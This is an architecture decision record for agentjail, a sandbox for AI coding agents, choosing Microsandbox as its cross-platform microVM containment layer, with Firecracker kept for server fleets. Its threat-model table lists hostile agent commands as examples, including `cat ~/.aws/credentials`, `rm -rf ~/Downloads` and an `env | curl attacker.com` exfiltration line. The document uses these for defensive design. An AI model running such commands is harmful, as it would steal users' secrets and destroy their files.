# 0016 — Tier 2 microVM substrate: Microsandbox as the cross-platform containment boundary

- **Status:** Proposed (pending Go-SDK validation + `agentjail-shield --tier2` prototype)
- **Date:** 2026-06-19
- **Deciders:** agentjail-core
- **Supersedes:** none — fills in the Tier 2 decision that [ADR 0001](./0001-os-sandbox-enforcement-layer.md) deliberately left open ("Tier 2 remains the target … sandbox-exec/Landlock is the 80% solution").
- **Related:** [ADR 0001](./0001-os-sandbox-enforcement-layer.md) (Tier 1.5), [ADR 0007](./0007-windows-support-deferred.md) (Windows), [ADR 0004](./0004-credential-broker-tier1.md) (credential broker), [`agentjail/research/libkrun-spike/`](../../agentjail/research/libkrun-spike/), [`agentjail/research/firecracker-spike/`](../../agentjail/research/firecracker-spike/)

## Context

Tier 2 is the row in the roadmap marked "🔬 spike done." Two spikes landed:

- **libkrun** (macOS laptop, Hypervisor.framework): measured **70–90 ms** cold boot to first guest userspace on Apple Silicon in our own spike (`agentjail/research/libkrun-spike/`).
- **Firecracker** (Linux + KVM fleet): jailer + virtio-net + iptables egress allowlist spike; needs a bare-metal Linux host to run (`agentjail/research/firecracker-spike/`).

The spikes proved the primitives but did **not** pick the production substrate — the thing `agentjail-vm` (or a `--tier2` mode on `agentjail-shield`) will actually call. The open question this ADR answers: *which open-source microVM project do we standardize on for Tier 2, given agentjail's long-term horizon?*

### Requirements (long-term)

1. **Cross-platform.** macOS (laptop), Linux (laptop + server), Windows. ADR 0007 deferred Windows because the hook/daemon port is bounded but the shield has no Windows primitive. A VM substrate that covers Windows via WSL2 reopens that path without a native sandbox port.
2. **Embeddable as a Go library.** agentjail is Go. We want a SDK, not a shell-out to a CLI we then parse.
3. **Egress control that maps to `network.allowed_hosts`.** The Tier 1.5 netproxy already enforces a host allowlist from `policy.yaml`; the VM boundary should accept the same list, not require a parallel iptables ruleset we hand-maintain.
4. **Secret protection.** Credentials never enter the guest — the VM-boundary analogue of the ADR 0004 credential broker.
5. **Fast enough for a per-session VM.** We are NOT aiming for per-tool-call ephemeral VMs (Firecracker's Lambda-shape model). The model is: one VM per agent session, booted once. Sub-second boot is the bar.
6. **Open source, permissively licensed.** agentjail is Apache 2.0; the containment substrate must be too.

### The shortlist

| Project | Backend | macOS | Linux | Windows | Boot | Egress filtering | License |
|---|---|---|---|---|---|---|---|
| **Microsandbox** | libkrun | HVF (native) | KVM | WSL2 | ~320 ms (reported) | deny-all + domain allowlist + secret swapping | Apache 2.0 |
| Firecracker | KVM only | No (needs Linux VM, no nested virt on Apple Silicon) | KVM | No | ~125 ms | manual (iptables) | Apache 2.0 |
| SmolVM | Firecracker/QEMU/libkrun | Hypervisor.framework | KVM | No | <200 ms | via backend | Apache 2.0 |
| libkrun (raw) | KVM/HVF | ARM64 native | KVM | No | 70–90 ms (our spike) | TSI socket-level | Apache 2.0 |
| gVisor | user-space kernel | No | Yes | No | ~ms | via iptables | Apache 2.0 |
| Lima | QEMU/VZ/krunkit | native | QEMU | WSL2 | ~seconds | manual | Apache 2.0 |

(Boot numbers except our own libkrun spike are from each project's docs and need re-measurement in our environment — see Follow-ups.)

## Decision

**Adopt Microsandbox as the primary Tier 2 substrate for the developer-laptop path (all three OSes), behind a `VMBackend` interface that keeps Firecracker as the server-fleet backend.**

Rationale, in priority order:

1. **It is built on libkrun.** Our existing macOS spike already proved libkrun on Apple Silicon (70–90 ms). Microsandbox's macOS path is the same Hypervisor.framework backend. The spike knowledge transfers directly; we are not betting on an unproven VMM.
2. **Cross-platform without a separate Windows port.** HVF on macOS, KVM on Linux, WSL2 on Windows. This is the single biggest long-term win: it closes the ADR 0007 Windows gap (the shield has no native Windows primitive) by making Windows a first-class Tier 2 target via WSL2 — consistent with 0007's "WSL is the recommended Windows path."
3. **Egress + secret model maps 1:1 to existing config.** Microsandbox's deny-all networking with domain allowlisting is exactly `network.allowed_hosts`, and its secret-protection (placeholders swapped on TLS handshake to allowlisted hosts, real tokens never in the guest) is the VM-boundary form of the ADR 0004 credential broker. One `policy.yaml` drives both the Tier 1.5 proxy and the Tier 2 VM boundary.
4. **Go SDK (v0.5.0+).** agentjail is Go; integrate as a library in `agentjail-shield`'s `--tier2` path rather than shelling out.
5. **OCI-compatible images.** Custom agent images (pre-baked Claude/Codex/Cursor + tools) via Dockerfile, instead of the hand-built Alpine rootfs the current spikes use.

### Architecture: defense in depth

```
agentjail-shield --tier2  -- claude
   │
   ├── boots microsandbox VM (libkrun backend)
   │     ├── mounts CWD into guest (read-write)
   │     ├── injects network.allowed_hosts as egress allowlist
   │     └── secret protection (credentials never enter guest)
   │
   └── inside the VM:
         ├── agentjail-daemon  (OPA engine, warm)
         ├── agentjail-hook    (semantic allow/deny/ask)
         └── agent process     (claude / codex / cursor)
```

The three columns have **zero overlap** — that is the whole point:

| Threat | Policy engine (Tier 1) | Kernel sandbox (Tier 1.5) | MicroVM (Tier 2) |
|---|---|---|---|
| `rm -rf ~/Downloads` | DENY (semantic rule) | EPERM (path deny) | can't reach host FS |
| `cat ~/.aws/credentials` | DENY (file policy) | EPERM (read deny) | file absent in guest |
| `git push --force main` | DENY (branch-aware rule) | can't enforce | can't enforce |
| `npm publish` | ASK (user confirms) | can't enforce | can't enforce |
| base64-obfuscated write to `~/.ssh` | bypassed | EPERM (shield catches) | can't reach host FS |
| kernel exploit / container escape | irrelevant | bypassed | separate kernel, host safe |
| MCP call to payments API | DENY (MCP allowlist) | can't enforce | can't enforce |
| `env \| curl attacker.com` | DENY (exfil rule) | localhost-only TCP | egress denied at VM |

The microVM cannot distinguish `git push --force main` from `git push origin feature-branch`, cannot ask "are you sure you want to `npm publish`?", and cannot allowlist specific MCP servers. The policy engine cannot stop a kernel exploit or an obfuscated-shell trick that the VM boundary catches trivially. **Tier 2 does not replace Tier 1/1.5; it adds a hard boundary underneath them.**

### Two backends, one interface

Long-term, Tier 2 carries **two** backends behind a `VMBackend` interface:

- **Microsandbox** — the developer-laptop path (macOS HVF / Linux KVM / Windows WSL2). One Go SDK, all three OSes.
- **Firecracker** — the server-fleet / hosted-runner / high-paranoia path (bare-metal Linux only). Production-hardened (AWS Lambda, Fly.io Machines), REST API for orchestration, snapshot/restore for pre-warmed VMs. This is the existing firecracker-spike's destination.

This matches the split the spikes already imply: libkrun for laptops, Firecracker for fleets. Microsandbox (libkrun-based) inherits the laptop slot and adds Windows; Firecracker keeps the fleet slot.

## Long-term horizon: pros and cons

### Pros

- **Single Go SDK across all three OSes.** One integration, one lifecycle wrapper, instead of per-platform VMM glue. The `agentjail-shield --tier2` path is the same code on macOS, Linux, and Windows/WSL2.
- **Closes the Windows gap structurally.** ADR 0007 split the Windows problem into "hook-layer port (bounded)" and "shield (no primitive)." Microsandbox gives the shield a Windows story (WSL2) without inventing an AppContainer/restricted-token sandbox — and WSL2 is already 0007's recommended Windows path, so the UX is consistent.
- **Egress + secrets map to existing config.** No parallel networking ruleset; `policy.yaml` is the single source of truth for both the proxy and the VM boundary.
- **Defense-in-depth is a differentiated offering.** No other project ships semantic policy (allow/deny/ask, branch-aware git rules, MCP allowlist, ask-the-user UX) *and* a microVM hard boundary together. The microVM-only projects give a locked room; agentjail gives a locked room with a guard who understands intent and can have a conversation about it.
- **Graduated enforcement, same config.** Users start on Tier 1 (zero friction, `curl | sh`) and upgrade to `--tier2` later without changing policy or workflow.
- **libkrun foundation is already de-risked.** Our own spike measured it; we are not adopting a black-box VMM.

### Cons / risks (and mitigations)

- **External-project dependency for the core boundary.** Microsandbox is younger than Firecracker and has a smaller bus factor. *Mitigation:* it is Apache 2.0 and built on libkrun (Red Hat maintained) + standard KVM/HVF primitives; if it stalls, the `VMBackend` interface lets us fall back to raw libkrun or SmolVM without rewriting the Tier 1/1.5 layers. The intelligence layer (the actual differentiator) is ours and VM-agnostic.
- **Boot overhead (~320 ms reported vs Firecracker ~125 ms, vs our libkrun 70–90 ms).** This rules out per-tool-call ephemeral VMs. *Accepted:* the Tier 2 model is one VM per agent session, booted once. Per-call isolation remains a Firecracker-on-fleet future, not a laptop target.
- **Windows via WSL2 is not native Windows.** Users must run WSL2 (and have hypervisor access). This is consistent with ADR 0007 but means Tier 2 on Windows is "Windows running a Linux guest," not a native Windows sandbox. Enterprise laptops with virtualization disabled still fall back to Tier 1 + 1.5.
- **Hypervisor requirement excludes locked-down environments.** No KVM/HVF → no Tier 2. Corporate laptops and some CI runners with virtualization disabled cannot use Tier 2. *Accepted:* Tier 1 + 1.5 remain the path there and are already shipped value.
- **OCI image management adds operational surface.** Building and versioning agent images (vs the spikes' hand-built Alpine rootfs) is a new pipeline. *Mitigation:* tracked as a follow-up ADR for the agent-image build/distribution pipeline.
- **Microsandbox claims (boot, egress, secret behavior) are from its docs, not yet re-measured by us.** *Mitigation:* the prototype follow-up re-measures boot and verifies the egress/secret behavior against our `allowlist.yaml` fixture before we commit to "Accepted."

## How agentjail's existing layers fit

| Layer | Role | Tier 2 changes it? |
|---|---|---|
| `agentjail-hook` (Tier 1) | Semantic policy + agent UX (explain *why*) | No — runs *inside* the VM, unchanged |
| `agentjail-daemon` (Tier 1) | OPA engine, warm, <5 ms decisions | No — socket just lives inside the VM |
| `agentjail-shield` (Tier 1.5) | Kernel sandbox (sbpl/Landlock) | Gains a `--tier2` mode that boots the VM and then runs the same sandbox inside it |
| `agentjail-netproxy` (Tier 1.5) | Host allowlist proxy | Becomes redundant inside a Tier 2 VM (egress enforced at VM boundary) but stays for Tier 1.5-only users |
| `policy.yaml` | Single source of truth | No — same file feeds both the proxy and the VM egress allowlist |
| ADR 0004 credential broker | Strips ambient creds, issues scoped ones | Complements VM secret protection: broker for Tier 1.5 users, VM secret-swap for Tier 2 users |
| ADR 0007 Windows deferral | No native Windows shield | Tier 2 WSL2 path gives Windows a containment story without a native sandbox port |

The self-protection locked set (`file_policy/agentjail_self`, `library/no-daemon-kill`, `library/no-hook-self-disable`, `command_policy/no-policy-mutation`, `resolver/*`) still applies inside the VM — an agent that convinces the user to disable the sandbox is a threat the microVM does not address, and agentjail's locked rules do.

## Long-term / enterprise horizon

Tier 1/1.5 sell the developer. **Tier 2 is what sells the CISO** — it converts
agentjail from a developer-safety tool into a procurement-defensible enterprise
control. This section records how the decision above serves the corporate
long-horizon, grounded in the existing ADRs rather than aspiration.

### Containment vs. enforcement — the audit-trail distinction

Today's strongest claim (ADR 0001) is *enforcement on the same OS the agent
runs on*: a kernel exploit or a `sandbox-exec` removal (the risk 0001 flagged)
escapes it. Tier 2 puts a **separate kernel** between the agent and the host.
The threat-matrix row `kernel exploit / container escape → separate kernel,
host safe` is the row that matters to a SOC2/ISO 27001 auditor: it converts
"policy says no" into "physically cannot reach." Layered audit — semantic
decision (Tier 1) + kernel denial (Tier 1.5) + VM-boundary syscall log (Tier 2)
— is materially more defensible than any single layer, and is what an evidence
request actually returns.

### Windows — the largest enterprise blocker, now unblocked

ADR 0007 deferred Windows because the shield has no native primitive. Tier 2's
WSL2 path changes the corporate math: no AppContainer/restricted-token port is
required — Windows engineers get containment via WSL2, which is already
Microsoft's recommended path and enabled by default on most enterprise Win11
fleet images. Windows is the majority of the enterprise laptop market; without
a Windows containment story agentjail is a non-starter for most Fortune-500
procurement. Tier 2 makes Windows a first-class Tier 2 target *without* a
native sandbox engineering effort — the cheapest way to roughly double
addressable market, and consistent with 0007's "WSL is the recommended Windows
path."

### Credential governance — ADR 0004 broker + VM secret protection together

ADR 0004's broker strips ambient creds and issues scoped, short-lived ones
(Tier 1.5). Tier 2's Microsandbox secret protection means **credentials never
enter the guest at all** — placeholders swapped on TLS handshake to allowlisted
hosts, real tokens never present in the agent's execution environment. The
combination is the strongest cred story short of HSM-backed per-call
attestation: even a fully-compromised agent physically cannot exfiltrate a token
because no real token exists in its environment. This maps directly to SOC2
CC6.1 (logical access) / ISO 27001 A.9.4.2 (network separation) — the controls
a corporate security team writes into a vendor-risk questionnaire.

### Egress control = DLP at the VM boundary

ADR 0004's own gap table admits the Tier 1.5 hole: "Raw TCP on 443 to a
non-allowlisted host would bypass the network proxy because it doesn't go
through `HTTPS_PROXY`." Tier 2's deny-all networking, enforced at the VMM
boundary, closes that — there is no path out that doesn't cross the
hypervisor. For a corporate DLP/SOC team, "egress is impossible except to an
allowlist, enforced below the agent's OS" is the exact control they want for
any process that touches source code + prod creds. It is driven by the *same*
`network.allowed_hosts` already in `policy.yaml` (ADR 0012 config overlay) —
no parallel ruleset for the platform team to drift.

### Fleet management — the two-backend split is the enterprise deployment story

The Microsandbox (laptops) / Firecracker (fleets) split maps to how
corporations actually deploy:

- **Developer laptops** → per-session Microsandbox VM (lightweight, one boot
  per session).
- **Hosted CI runners / internal agent platforms** → Firecracker with
  snapshot/restore for pre-warmed VMs + REST API for orchestration (the
  existing firecracker-spike's destination).

One `policy.yaml` drives both. A platform team manages 1000 dev laptops + 50
CI runners from a single policy source and the same intelligence layer. The
`VMBackend` interface (`boot / mount / set-egress / exec / teardown`) keeps
the fleet backend swappable without touching Tier 1/1.5.

### Graduated enforcement = the enterprise adoption curve

Corporations pilot, then expand. Tier 2 being opt-in
(`agentjail-shield --tier2`) means a security team can deploy Tier 1 (zero
friction, `curl | sh`) to 1000 engineers, prove value from the audit logs,
then flip the high-paranoia teams (finance, prod-access, anyone touching
customer data) to Tier 2 *without changing policy or workflow*. This is the
canonical enterprise land-and-expand pattern, and it works because one config
(ADR 0012) drives all three tiers.

### Defense-in-depth as the procurement differentiator

No competitor offers semantic policy + kernel sandbox + microVM together. The
microVM-only players (Microsandbox, Firecracker) give a locked room; agentjail
gives a locked room with a guard that understands intent (`git push --force
main` vs `feature-branch`), can **ask** the user (`npm publish`?), and produces
a semantic audit. The enterprise buyer's control triad is **prevent +
explain + evidence** — only the layered architecture delivers all three. For
OSS adoption the positioning is "not competing with Microsandbox, competing
with 'I'll just be careful'"; for enterprise it is "the only offering that
does both layers."

### Honest corporate gaps (worth knowing before a sales conversation)

- **Hypervisor requirement.** Some regulated environments (financial, gov)
  disable VT-x/HVF on laptops. Those fall back to Tier 1/1.5 — still better
  than nothing, but not the containment story. Accepted above.
- **WSL2 ≠ native Windows.** Requires the user to run WSL2. Most enterprise
  Win11 has it, but it is one more item for procurement to bless, and it is
  "Windows running a Linux guest," not a native Windows sandbox.
- **Per-session, not per-call.** ~320 ms boot fixes the model at one VM per
  agent session. A corporate team wanting true per-tool-call isolation
  (Lambda-shape) must wait for the Firecracker-fleet future — not the laptop
  path. Fine for interactive dev; a real constraint for some CI patterns.
- **External dependency (Microsandbox).** A corporate vendor-risk review will
  ask about bus-factor. The `VMBackend` interface + raw-libkrun fallback is
  the answer, but it is a conversation, not a slam-dunk. Firecracker (Apache
  2.0, AWS Lambda-hardened) on the fleet side carries more enterprise weight.

Tier 3 (eBPF LSM / macOS SystemExtension) stays open and coherent: it becomes
the fleet-wide boundary for machines that cannot or will not run a VM
(locked-down servers, regulated laptops with virtualization disabled), while
Tier 2 is the per-session VM for everyone else. Tier 2 does not foreclose
Tier 3; it clarifies it.

## Consequences

**Positive:**

- Tier 2 becomes a real, shippable, cross-platform containment boundary instead of two isolated spikes.
- Windows gets a Tier 2 path (WSL2) without a native sandbox engineering effort — the biggest scope win since ADR 0007.
- One `policy.yaml` drives Tier 1, 1.5, and 2 — graduated enforcement with no config rewrite.
- The defense-in-depth combination (semantic policy + kernel sandbox + microVM) is not offered by any microVM-only or policy-only competitor.

**Negative:**

- New external dependency (microsandbox Go SDK) on the containment path — requires the `VMBackend` interface and a documented fallback.
- Boot overhead fixes the Tier 2 model at per-session, not per-call, on laptops.
- Windows Tier 2 is WSL2-only; native Windows sandbox remains unaddressed (and is still out of scope per ADR 0007).
- Hypervisor requirement means Tier 2 is opt-in and unavailable on some machines; Tier 1 + 1.5 must stay self-sufficient.

**Follow-ups:**

1. **Prototype `agentjail-shield --tier2`** using the microsandbox Go SDK; re-measure boot, verify egress deny-all + `network.allowed_hosts` allowlist, verify secret protection against the existing `allowlist.yaml` fixture. Promote this ADR to Accepted on success.
2. **Define the `VMBackend` interface** (`boot / mount / set-egress / exec / teardown`) with a microsandbox impl and a Firecracker impl (the latter reusing `agentjail/research/firecracker-spike/`).
3. **ADR for the OCI agent-image build/distribution pipeline** (Dockerfile → image → versioned release artifact).
4. **Revisit ADR 0007** to record that Tier 2 WSL2 gives Windows a containment path; the native-hook-port plan in 0007 is unchanged.
5. **Update `docs/ARCHITECTURE.md` Tier 2 section** to name Microsandbox (laptop) + Firecracker (fleet) once this ADR is Accepted.

## Rejected alternatives

| Alternative | Why rejected |
|---|---|
| **SlicerVM** (slicervm.com) | Commercial hosted platform ($250/mo/server), not an embeddable library, no Windows, data leaves the host. Wrong shape for an OSS agent guardrail that must run on a developer's laptop with zero infra. Its egress-filtering + credential-injection ideas are good and are exactly what Microsandbox provides as OSS. |
| **Firecracker alone** | Linux + KVM only. No macOS laptop path (no nested virt on Apple Silicon — see firecracker-spike README), no Windows. Right for the fleet backend, wrong as the sole substrate. Kept as the *second* backend. |
| **libkrun raw** | Proven on macOS in our spike, but ships no built-in egress allowlist, no secret protection, no Windows, no OCI. Using it directly means rebuilding what Microsandbox already layers on top of it. Right fallback behind the `VMBackend` interface, wrong default. |
| **gVisor** | Linux only, user-space kernel with measurable syscall overhead. No macOS/Windows. No semantic gain over a real VM. |
| **SmolVM** | Attractive multi-backend abstraction (Firecracker + Hypervisor.framework + QEMU), but less mature than Microsandbox's agent-focused tooling and no Windows. Watch as a future `VMBackend` candidate if Microsandbox stalls. |
| **Lima** | Seconds-scale boot, manual networking. Too heavy for a per-session agent VM. |
| **Apple Containerization (v1.0)** | VM-per-container on macOS, but macOS-only — fails the cross-platform requirement. |
| **Stay spike-only / do not build Tier 2** | ADR 0001's honest position when Tier 1.5 was the 80% solution. Revisited here because the cross-platform + egress + secret combination now available makes a real Tier 2 worth the opt-in complexity, and because it is the structural fix for the macOS `sandbox-exec` removal risk 0001 flagged. |
